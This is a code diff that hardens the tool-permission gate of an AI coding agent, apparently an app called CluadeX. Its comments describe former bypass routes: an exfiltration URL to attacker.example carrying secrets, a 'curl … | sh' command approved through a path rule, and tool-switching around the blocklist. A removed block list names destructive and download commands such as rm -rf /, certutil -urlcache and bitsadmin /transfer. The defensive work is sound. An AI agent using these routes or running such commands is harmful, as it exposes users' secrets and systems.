@@ -377,21 +377,7 @@ public class AgentToolService : IDisposable
                 }
                 else
                 {
-                    // web_fetch carries a url — without it a URL-pattern rule could never match.
-                    string resource = call.GetArg("path", call.GetArg("command", call.GetArg("url", call.ToolName)));
-                    string scope = call.Type switch
-                    {
-                        ToolType.WriteFile or ToolType.EditFile or ToolType.MultiEdit or ToolType.CreateDirectory => "write",
-                        ToolType.RunCommand => "execute",
-                        ToolType.ReadFile or ToolType.ListFiles or ToolType.SearchFiles or ToolType.SearchContent
-                            or ToolType.GlobSearch or ToolType.Grep => "read",
-                        _ => "execute",
-                    };
-                    // No rule of the user's matches → the defaults: reading inside the open project is free
-                    // (a fresh install asked before every single read_file — 30 prompts for one review),
-                    // everything else asks.
-                    var perm = _permissionService.FindRule(resource, scope, call.ToolName)
-                        ?? (scope == "read" && IsInsideProject(resource) ? PermAction.Allow : PermAction.Ask);
+                    var (perm, scope, resource) = EvaluatePermission(call);
                     if (perm == PermAction.Deny)
                         return Fail(call, $"Permission denied for {scope}: {resource}");
                     if (perm == PermAction.Ask)
@@ -400,7 +386,7 @@ public class AgentToolService : IDisposable
                             && await OnPermissionRequired.Invoke(new PermissionRequestInfo
                             {
                                 ToolName = call.ToolName,
-                                Detail = $"{scope}: {resource}",
+                                Detail = DescribePermissionRequest(call, scope, resource),
                                 Diff = TryComputePreviewDiff(call),
                             });
                         if (!allowed)
@@ -412,7 +398,7 @@ public class AgentToolService : IDisposable
             // ── PreToolUse hooks ──
             var hookResult = await _hookService.ExecutePreToolHooksAsync(call, ct);
             if (!hookResult.Success)
-                return Fail(call, $"PreToolUse hook blocked execution: {hookResult.Message}");
+                return Fail(call, string.Format(L("chat.perm.hookBlocked"), hookResult.Message));
 
             var toolResult = call.Type switch
             {
@@ -1456,6 +1442,131 @@ public class AgentToolService : IDisposable
         return $"run {call.McpServerName ?? "MCP"} · {leaf} {args}";
     }
 
+    /// <summary>
+    /// What the permission gate decides for <paramref name="call"/> before anyone is asked: the user's first
+    /// matching rule, else the default (reading inside the open project is free, everything else asks).
+    /// Also returns the scope and the resource the rule was matched against — what the prompt names.
+    /// Public so the contract harness can prove the gate without running the tool.
+    /// </summary>
+    public (PermAction Action, string Scope, string Resource) EvaluatePermission(ToolCall call)
+    {
+        string scope = call.Type switch
+        {
+            ToolType.WriteFile or ToolType.EditFile or ToolType.MultiEdit or ToolType.CreateDirectory => "write",
+            ToolType.RunCommand => "execute",
+            ToolType.ReadFile or ToolType.ListFiles or ToolType.SearchFiles or ToolType.SearchContent
+                or ToolType.GlobSearch or ToolType.Grep => "read",
+            _ => "execute",
+        };
+
+        // A network destination is matched as a URL, never as a path: "**/src/**" → Allow used to approve
+        // web_fetch("https://attacker.example/src/?d=<secrets>") without a prompt. Only the two tools that
+        // really fetch a URL are judged by one — a stray "url" on repl / powershell / git_push / agent_spawn
+        // used to make a URL Allow rule approve THAT tool.
+        if (call.Type is ToolType.WebFetch or ToolType.GitClone)
+        {
+            string url = call.GetArg("url", "");
+            // A clone is judged by the URL it really fetches ("owner/repo" → https://github.com/owner/repo.git).
+            if (call.Type == ToolType.GitClone && url.Length > 0) url = GitHubService.NormalizeRepoUrl(url);
+            var urlPerm = _permissionService.FindUrlRule(url, scope, call.ToolName, legacyResource: call.ToolName)
+                          ?? PermAction.Ask;
+            // A rule vouches for where a clone comes FROM, not where it lands: a whole repository written
+            // outside the open project (a startup folder, another repo's .git) is asked about. Deny stands.
+            if (urlPerm == PermAction.Allow && call.Type == ToolType.GitClone && !CloneTargetIsInProject(call))
+                urlPerm = PermAction.Ask;
+            return (urlPerm, scope, url.Length > 0 ? url : call.ToolName);
+        }
+
+        string resource = PermissionResource(call);
+        // No rule of the user's matches → the defaults: reading inside the open project is free
+        // (a fresh install asked before every single read_file — 30 prompts for one review),
+        // everything else asks.
+        var perm = _permissionService.FindRule(resource, scope, call.ToolName)
+            ?? (scope == "read" && IsInsideProject(resource) ? PermAction.Allow : PermAction.Ask);
+        return (perm, scope, resource);
+    }
+
+    /// <summary>
+    /// What a non-URL call's rule is matched against: the argument its executor ACTUALLY acts on, else the
+    /// tool name. A tool is never judged by an argument it ignores — "**/src/**" → Allow approved
+    /// run_command("curl … | sh", path: "src/x") and git_push(path: "src/x"), and "npm *" → Allow approved
+    /// git_push(command: "npm test"). So: a command tool by its command, a file tool by its path, and every
+    /// other tool (git_push, git_commit, agent_spawn, gh_*, repl …) by its name — a rule naming the tool still
+    /// works. repl runs its "code", which is not a path or a shell command; the prompt shows that code.
+    /// </summary>
+    private static string PermissionResource(ToolCall call)
+    {
+        string tool = call.ToolName;
+        return call.Type switch
+        {
+            ToolType.RunCommand or ToolType.RunBuild or ToolType.RunTests or ToolType.TaskCreate
+                => call.GetArg("command", tool),
+            ToolType.PowerShell => call.GetArg("command", call.GetArg("script", tool)),
+            // git_add stages "paths" (native schema) and falls back to "path".
+            ToolType.GitAdd => call.GetArg("paths", "") is { Length: > 0 } paths ? paths : call.GetArg("path", tool),
+            ToolType.NotebookEdit => call.GetArg("notebook_path", call.GetArg("path", tool)),
+            ToolType.GitWorktreeRemove => call.GetArg("path", call.GetArg("name", tool)),
+            _ when ReadsPathArgument(call.Type) => call.GetArg("path", tool),
+            _ => tool,
+        };
+    }
+
+    /// <summary>The tools whose executor takes its target from the "path" argument.</summary>
+    private static bool ReadsPathArgument(ToolType type) => type is
+        ToolType.ReadFile or ToolType.WriteFile or ToolType.EditFile or ToolType.MultiEdit
+        or ToolType.ListFiles or ToolType.SearchFiles or ToolType.SearchContent or ToolType.CreateDirectory
+        or ToolType.GlobSearch or ToolType.Grep or ToolType.ListSymbols or ToolType.LspDiagnostics
+        or ToolType.GitDiff or ToolType.GitWorktreeCreate
+        or ToolType.HexOpen or ToolType.HexRead or ToolType.HexSearch or ToolType.HexPatch or ToolType.HexInfo;
+
+    /// <summary>
+    /// The folder a git_clone call writes to, exactly as the executor uses it: "directory", else the legacy
+    /// "path", a relative one resolved against the open project. "" = no folder given (the clone goes to
+    /// CluadeX's own Projects folder); null = not a usable path.
+    /// </summary>
+    private string? CloneTarget(ToolCall call)
+    {
+        string dir = call.GetArg("directory", "");
+        if (string.IsNullOrEmpty(dir)) dir = call.GetArg("path", "");
+        if (string.IsNullOrEmpty(dir)) return "";
+        try
+        {
+            bool relativeToProject = !Path.IsPathRooted(dir) && _fileSystem.HasWorkingDirectory;
+            return Path.GetFullPath(relativeToProject ? Path.Combine(_fileSystem.WorkingDirectory, dir) : dir);
+        }
+        catch { return null; }
+    }
+
+    /// <summary>A clone that lands in the open project (or names no folder at all).</summary>
+    private bool CloneTargetIsInProject(ToolCall call)
+    {
+        string? target = CloneTarget(call);
+        if (target == null) return false;
+        if (target.Length == 0) return true;
+        return _fileSystem.HasWorkingDirectory && IsUnder(_fileSystem.WorkingDirectory, target);
+    }
+
+    /// <summary>What the permission prompt shows: scope and resource, plus what the resource alone hides —
+    /// a clone's target folder, or the code a REPL call is about to run (its resource is just "repl").</summary>
+    private string DescribePermissionRequest(ToolCall call, string scope, string resource)
+    {
+        string detail = $"{scope}: {resource}";
+        if (call.Type == ToolType.GitClone)
+        {
+            string? target = CloneTarget(call);
+            string shown = target ?? call.GetArg("directory", call.GetArg("path", ""));
+            if (shown.Length > 0) detail += $" → {shown}";
+        }
+        else if (call.Type == ToolType.Repl)
+        {
+            string code = ReplCode(call);
+            if (code.Length > 0 && code != resource) detail += "\n" + code;
+        }
+        return detail;
+    }
+
+    private static string ReplCode(ToolCall call) => call.GetArg("code", call.GetArg("input", call.GetArg("command")));
+
     /// <summary>A read target inside the open project: a relative path or one under the working directory.
     /// A tool-name placeholder (a search with no path) means "the project".</summary>
     private bool IsInsideProject(string resource)
@@ -1995,7 +2106,7 @@ public class AgentToolService : IDisposable
         if (string.IsNullOrEmpty(cmd))
             return Fail(call, "run_build: couldn't detect a build system in the project or the folders below it (no .sln/.csproj/Cargo.toml/go.mod/package.json/pom.xml/Makefile/…). Pass an explicit 'command', or use run_command.");
 
-        var danger = CheckDangerousCommand(cmd);
+        var danger = CheckDangerousCommand(cmd, DangerousCommandCheck.DialectOf(ShellRunner.DefaultShell));
         if (danger != null) return Fail(call, danger);
 
         // Always from the project root: detected commands are root-relative, whatever `cd` the model did.
@@ -2031,7 +2142,7 @@ public class AgentToolService : IDisposable
         if (string.IsNullOrEmpty(cmd))
             return Fail(call, "run_tests: couldn't detect a test runner in the project or the folders below it (no test project, Cargo.toml, go.mod, pyproject, package.json, pom.xml…). Pass an explicit 'command', or use run_command.");
 
-        var danger = CheckDangerousCommand(cmd);
+        var danger = CheckDangerousCommand(cmd, DangerousCommandCheck.DialectOf(ShellRunner.DefaultShell));
         if (danger != null) return Fail(call, danger);
 
         var run = await RunShellAsync(cmd, 300_000, useSessionCwd: false, ct);
@@ -2120,8 +2231,10 @@ public class AgentToolService : IDisposable
             return Fail(call, "Missing 'command' argument");
 
         // Security: block dangerous commands (defense-in-depth, NOT a boundary — the permission prompt
-        // is). Shared helper so powershell/repl can't bypass the run_command blocklist by switching tools.
-        var dangerReason = CheckDangerousCommand(command);
+        // is). The blocklist covers the shell tools (this one, powershell, task_create, run_build,
+        // run_tests) so switching tools can't bypass it; repl runs python/node code, and for it the
+        // permission prompt, which shows the code, is the boundary.
+        var dangerReason = CheckDangerousCommand(command, DangerousCommandCheck.DialectOf(ShellRunner.DefaultShell));
         if (dangerReason != null)
             return Fail(call, dangerReason);
 
@@ -2387,14 +2500,17 @@ public class AgentToolService : IDisposable
     private async Task<ToolResult> ExecuteGitCloneAsync(ToolCall call, CancellationToken ct)
     {
         string url = call.GetArg("url");
-        // "path" was the advertised name for a long time — honour both so the requested
-        // target directory is never silently ignored.
-        string dir = call.GetArg("directory", "");
-        if (string.IsNullOrEmpty(dir)) dir = call.GetArg("path", "");
         if (string.IsNullOrEmpty(url))
             return Fail(call, "Missing 'url' argument");
 
-        var r = string.IsNullOrEmpty(dir)
+        // "directory", or "path" (the advertised name for a long time) — resolved the same way the permission
+        // gate resolved it. A relative folder used to land next to CluadeX's own working directory while the
+        // gate judged it as inside the project.
+        string? dir = CloneTarget(call);
+        if (dir == null)
+            return Fail(call, string.Format(L("chat.clone.badTarget"), call.GetArg("directory", call.GetArg("path", ""))));
+
+        var r = dir.Length == 0
             ? await _gitHubService.CloneRepoAsync(url, null, ct)
             : await _gitHubService.CloneRepoAsync(url, dir, ct);
         return GitToToolResult(call, r, $"Cloned: {url}");
@@ -2501,22 +2617,73 @@ public class AgentToolService : IDisposable
         if (string.IsNullOrEmpty(url))
             return Fail(call, "Missing 'url' argument");
 
+        WebFetchPage page;
         try
         {
-            string content = await _webFetchService.FetchAsync(url, ct);
-            return new ToolResult
-            {
-                Type = call.Type,
-                ToolName = call.ToolName,
-                Success = true,
-                Output = content.Length > 4000 ? content[..4000] + "\n... (truncated)" : content,
-                Summary = $"Fetched {url} ({content.Length} chars)",
-            };
+            page = await _webFetchService.FetchAsync(url, (from, to) => AllowRedirectAsync(call.ToolName, from, to), ct);
         }
-        catch (Exception ex)
+        catch (OperationCanceledException)
         {
-            return Fail(call, $"Fetch failed: {ex.Message}");
+            return Fail(call, L("chat.web.cancelled"));
         }
+
+        string shownUrl = page.Url?.AbsoluteUri ?? url;
+        string? target = page.RedirectTarget?.AbsoluteUri;
+        switch (page.Outcome)
+        {
+            case WebFetchOutcome.Ok:
+                string content = page.Content;
+                return new ToolResult
+                {
+                    Type = call.Type,
+                    ToolName = call.ToolName,
+                    Success = true,
+                    Output = content.Length > 4000 ? content[..4000] + "\n... (truncated)" : content,
+                    Summary = $"Fetched {shownUrl} ({content.Length} chars)",
+                };
+            case WebFetchOutcome.InvalidUrl:
+                return Fail(call, string.Format(L("chat.web.invalidUrl"), url));
+            case WebFetchOutcome.HttpError:
+                return Fail(call, string.Format(L("chat.web.httpError"), shownUrl, page.StatusCode, page.Reason));
+            case WebFetchOutcome.RedirectNotFollowed:
+                return Fail(call, string.Format(L("chat.web.redirectNotFollowed"), shownUrl, target));
+            case WebFetchOutcome.RedirectNotWeb:
+                return Fail(call, string.Format(L("chat.web.redirectNotWeb"), shownUrl, target));
+            case WebFetchOutcome.TooManyRedirects:
+                return Fail(call, string.Format(L("chat.web.tooManyRedirects"), WebFetchService.MaxRedirects, shownUrl));
+            case WebFetchOutcome.TimedOut:
+                return Fail(call, string.Format(L("chat.web.timedOut"), shownUrl, (int)Math.Round(_webFetchService.FetchTimeout.TotalSeconds)));
+            default:
+                return Fail(call, string.Format(L("chat.web.failed"), shownUrl));
+        }
+    }
+
+    /// <summary>
+    /// Whether web_fetch follows a redirect from <paramref name="from"/> to <paramref name="to"/>. The hop gets
+    /// the same URL check as the first request: a Deny rule stops it, an Allow rule (for that URL) passes it,
+    /// and with no rule a hop within the same site is followed — the user already let the request go there —
+    /// while a hop to another site asks. Auto-followed, an allowed host with an open redirect reached every
+    /// other host without a prompt. Public so the contract harness can prove it against a localhost mock.
+    /// </summary>
+    public async Task<bool> AllowRedirectAsync(string toolName, Uri from, Uri to)
+    {
+        if (!_settingsService.Settings.Features.PermissionSystem) return true;   // the gate is off everywhere
+        var hop = new ToolCall
+        {
+            Type = ToolType.WebFetch,
+            ToolName = string.IsNullOrEmpty(toolName) ? "web_fetch" : toolName,
+            Arguments = new() { ["url"] = to.AbsoluteUri },
+        };
+        var (perm, _, _) = EvaluatePermission(hop);
+        if (perm == PermAction.Deny) return false;
+        if (perm == PermAction.Allow) return true;
+        if (WebFetchService.IsSameSite(from, to)) return true;
+        return OnPermissionRequired != null
+            && await OnPermissionRequired.Invoke(new PermissionRequestInfo
+            {
+                ToolName = hop.ToolName,
+                Detail = string.Format(L("chat.perm.redirect"), from.AbsoluteUri, to.AbsoluteUri),
+            });
     }
 
     // ════════════════════════════════════════════
@@ -2674,15 +2841,27 @@ public class AgentToolService : IDisposable
     private async Task<ToolResult> ExecuteReplAsync(ToolCall call, CancellationToken ct)
     {
         string language = call.GetArg("language", call.GetArg("lang", "python")).ToLowerInvariant();
-        string code = call.GetArg("code", call.GetArg("input", call.GetArg("command")));
+        string code = ReplCode(call);
         string action = call.GetArg("action", "exec").ToLowerInvariant();
+
+        // Only the two interpreters the tool advertises. The old fallback started ANY program named in
+        // 'language' — "cmd", "powershell", "bash" — and piped the code into it as a shell. The shell
+        // blocklist (CheckDangerousCommand) covers the shell tools; for repl the boundary is the permission
+        // prompt, which shows the code. One session per interpreter, whatever spelling named it.
+        string? family = language switch
+        {
+            "python" or "python3" or "py" => "python",
+            "node" or "nodejs" or "javascript" or "js" => "node",
+            _ => null,
+        };
+        string sessionKey = family ?? language;
 
         if (action == "close" || action == "stop")
         {
-            if (_replSessions.TryGetValue(language, out var existing))
+            if (_replSessions.TryGetValue(sessionKey, out var existing))
             {
                 existing.Dispose();
-                _replSessions.Remove(language);
+                _replSessions.Remove(sessionKey);
                 return new ToolResult
                 {
                     Type = call.Type, ToolName = call.ToolName, Success = true,
@@ -2696,27 +2875,23 @@ public class AgentToolService : IDisposable
         if (string.IsNullOrEmpty(code))
             return Fail(call, "Missing 'code' argument");
 
-        // Get or create REPL session
-        if (!_replSessions.TryGetValue(language, out var session) || session.HasExited)
-        {
-            string exe = language switch
-            {
-                "python" or "py" => OperatingSystem.IsWindows() ? "python" : "python3",
-                "node" or "nodejs" or "javascript" or "js" => "node",
-                _ => language,
-            };
+        if (family == null)
+            return Fail(call, string.Format(L("chat.repl.unsupported"), language));
+        string exe = family == "python"
+            ? (OperatingSystem.IsWindows() ? "python" : "python3")
+            : "node";
 
-            string args = language switch
-            {
-                "python" or "py" => "-i -u", // Interactive, unbuffered
-                "node" or "nodejs" or "javascript" or "js" => "-i",
-                _ => "",
-            };
+        // Get or create REPL session
+        if (!_replSessions.TryGetValue(sessionKey, out var session) || session.HasExited)
+        {
+            string args = family == "python"
+                ? "-i -u"   // Interactive, unbuffered
+                : "-i";     // node
 
             try
             {
                 session = new ReplSession(exe, args, _fileSystem.WorkingDirectory);
-                _replSessions[language] = session;
+                _replSessions[sessionKey] = session;
             }
             catch (Exception ex)
             {
@@ -2764,7 +2939,7 @@ public class AgentToolService : IDisposable
 
         // Same blocklist as run_command — a background task is still a shell command, and without this check
         // switching from run_command to task_create walked straight past it.
-        var dangerReason = CheckDangerousCommand(command);
+        var dangerReason = CheckDangerousCommand(command, DangerousCommandCheck.Dialect.Cmd);
         if (dangerReason != null)
             return Fail(call, dangerReason);
 
@@ -3358,6 +3533,9 @@ public class AgentToolService : IDisposable
 
         return args;
     }
+
+    /// <summary>A string in the UI language (Services/Localization/ChatKeys.cs) — tool results show in the chat.</summary>
+    private static string L(string key) => LocalizedResources.Instance[key];
 
     private static ToolResult Fail(ToolCall call, string error)
     {
@@ -4318,41 +4496,16 @@ public class AgentToolService : IDisposable
     // ════════════════════════════════════════════
 
     /// <summary>Returns a block reason if <paramref name="command"/> matches a known-dangerous pattern
-    /// (when DangerousCommandBlocking is on), else null. Defense-in-depth, NOT a security boundary — the
-    /// permission prompt is. Shared by run_command + powershell so the blocklist can't be bypassed by
-    /// switching tools.</summary>
-    private string? CheckDangerousCommand(string command)
+    /// (when DangerousCommandBlocking is on), else null. Defense-in-depth for the shell tools — run_command,
+    /// powershell, task_create, run_build, run_tests — NOT a security boundary: the permission prompt is. The
+    /// list lives in <see cref="DangerousCommandCheck"/>, shared with auto-run shell code blocks and the
+    /// autonomous verify command, so switching tools can't step around it. repl runs python/node, not a
+    /// shell; for it the permission prompt (which shows the code) is the boundary.</summary>
+    /// <param name="dialect">The shell the command will run in — it decides which lines are commands.</param>
+    private string? CheckDangerousCommand(string command, DangerousCommandCheck.Dialect dialect)
     {
         if (!_settingsService.Settings.Features.DangerousCommandBlocking) return null;
-        string cmdLower = command.ToLowerInvariant().Trim();
-        string[] blockedPrefixes = [
-            "rm -rf /", "rm -rf ~", "rm -rf .",
-            "format ", "format\t",
-            "del /s", "del /f", "del /q",
-            "rmdir /s", "rd /s",
-            "shutdown", "restart-computer", "stop-computer",
-            "reg delete", "reg add",
-            "net user", "net localgroup",
-            "takeown", "icacls",
-            "mkfs.", "dd if=",
-            "> /dev/", ">/dev/",
-        ];
-        string[] blockedContains = [
-            "| rm ", "| del ", "&& rm ", "&& del ",
-            "; rm ", "; del ", "` rm ", "` del ",
-            "invoke-webrequest", "invoke-restmethod",
-            "start-bitstransfer",
-            "certutil -urlcache",
-            "bitsadmin /transfer",
-            // PowerShell destructive forms (piped/chained — prefix matching misses these)
-            "remove-item -recurse", "remove-item -force", "-recurse -force",
-            "format-volume", "clear-disk", "format-disk",
-        ];
-        foreach (var b in blockedPrefixes)
-            if (cmdLower.StartsWith(b)) return $"Command blocked for safety: {command}";
-        foreach (var b in blockedContains)
-            if (cmdLower.Contains(b)) return $"Command blocked for safety: {command}";
-        return null;
+        return DangerousCommandCheck.FindBlocked(command, dialect) != null ? $"Command blocked for safety: {command}" : null;
     }
 
     private async Task<ToolResult> ExecutePowerShellAsync(ToolCall call, CancellationToken ct)
@@ -4361,7 +4514,7 @@ public class AgentToolService : IDisposable
         if (string.IsNullOrEmpty(command))
             return Fail(call, "Missing 'command' argument");
 
-        var psDanger = CheckDangerousCommand(command);
+        var psDanger = CheckDangerousCommand(command, DangerousCommandCheck.Dialect.PowerShell);
         if (psDanger != null)
             return Fail(call, psDanger);
 
